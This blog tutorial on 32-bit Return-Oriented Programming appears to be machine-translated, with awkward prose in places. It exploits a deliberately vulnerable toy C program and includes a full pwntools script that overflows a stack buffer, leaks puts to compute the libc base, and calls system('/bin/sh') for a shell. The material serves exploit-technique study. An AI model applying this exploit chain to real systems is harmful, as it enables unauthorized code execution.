---
title: "[PWNABLE] ROP 32bit"
description: "※ Please tell us if there is a wrong part. We will fix it after confirmation. ※ For ROP, we’ve never mentioned some time before. Return-Oriented Programming is a method to bypass ASLR, which is one of the attacks to perform by reconfiguring functions using gadget. ROP 32"
date: "2023-12-01"
translation_key: "tistory-a06ebd940643"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-ROP32bit"
private: false
---

**※ Please tell us if there is a wrong part. We will fix it after confirmation. *****

We’ve never mentioned some time before ROP.

Return-Oriented Programming

It is a technique to bypass ASLR, one of the memory protection methods.

ROP has a slight difference in how to attack in 32-bit and 64-bit environments.

The 32-bit uses a stack, but the 64-bit is called a function call that uses a register and stack.

First, let’s go about 32-bit ROP.

```
#include <stdio.h>

int main(){
	char input[0x50];
	puts("Hello! Whrd ");

	read(0,input,0x100);
	return 0 ;
}
```

It’s a very simple example that I’ve seen before.

The process to perform attacks is similar to RTL-Chaining.

The difference is that ROP will find the address of libc\ base to bypass ASLR.

Click here to view the attack scenario.

1\. libc\ base

2\. Getting Started

This two processes are done in multiple ways.

I’m going to look back and look at the example above.

! [](/assets/images/tistory/tistory-a06ebd940643/001.png)

32-bit compiler environment and protection laws are all off.

If so, it means that you don’t need to leak the canary to perform the attack or do other things.

How to get libc\ base? ?

The answer is to output the real address of the function that got is pointed.

In the morning example code, the output number is puts.

If you use this function, you can perform attacks.

In this case, the 32-bit to use the gadget will pass the argument only using the stack.

In other words, it is possible to attack even if you use some gadgets in using pop-ret gadgets.

! [](/assets/images/tistory/tistory-a06ebd940643/002.png)

The size of the buffer is 0x54 and you need to add sfp to the total 0x58 stack.

I want to configure the chain now.

As we said, we will deliver the argument through the stack.

func is running first and the gadget is entered to meet the number of arguments.

If you enter the value in your stack,

The argument is delivered to func and is excluded from the stack by the gadget.

```
payload = b'A'*0x54
payload += b'B'*0x4

payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)
```

can be configured as above.

From now, each person has different ways.

Here is a way to calculate the value as p.recv, and perform the attack.

ret to main

We use a lot of ways to return to the main function, so we will explain it in this way.

If you find the real address of puts through the code above, how should I do? ?

You need to calculate libc\ base by using the offset of puts.

```
puts_got = e.got['puts']
puts_plt = e.plt['puts']
main = e.sym['main']

ret = 0x0804900e
pr = 0x08049196

payload = b'A'*0x54
payload += b'B'*0x4

payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)

payload += p32(main)

pause()
p.sendafter(b'Whrd', payload)

p.recvn(2)
libc_base = u32(p.recvn(4)) - libc.sym['puts']
print('libc_base = ',hex(libc_base))
```

If you show the code first, it seems like above.

The libc file contains the offset of all functions.

! [](/assets/images/tistory/tistory-a06ebd940643/003.png)

libc file /lib/i386-linux-gnu/libc.so.6

Please check the file.

! [](/assets/images/tistory/tistory-a06ebd940643/004.png)

You can see that the address is not in offset format.

If you look at the code, you can save libc\ base if you get the offset in the real address of the leaked puts.

Configuring system('/bin/sh\x00'); based on the old code.

Here is a way to use the bss area or find the address itself of the string.

We will handle the way of the latter.

```
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A'*0x54
payload += b'B'*0x4

payload += p32(system)
payload += p32(pr)
payload += p32(binsh)

p.sendafter(b'Whrd', payload)
```

All payloads are as follows:

```
from pwn import *

p = process('./rop32')
e = ELF('./rop32')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

##############################################

puts_got = e.got['puts']
puts_plt = e.plt['puts']
main = e.sym['main']

ret = 0x0804900e
pr = 0x08049196

############### stage 1 : libc_base###########

payload = b'A'*0x54
payload += b'B'*0x4

payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)

payload += p32(main)

pause()
p.sendafter(b'Whrd', payload)

p.recvn(2)
libc_base = u32(p.recvn(4)) - libc.sym['puts']
print('libc_base = ',hex(libc_base))

############### stage 2 : attack   ###########

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A'*0x54
payload += b'B'*0x4

payload += p32(system)
payload += p32(pr)
payload += p32(binsh)

p.sendafter(b'Whrd', payload)

p.interactive()
```
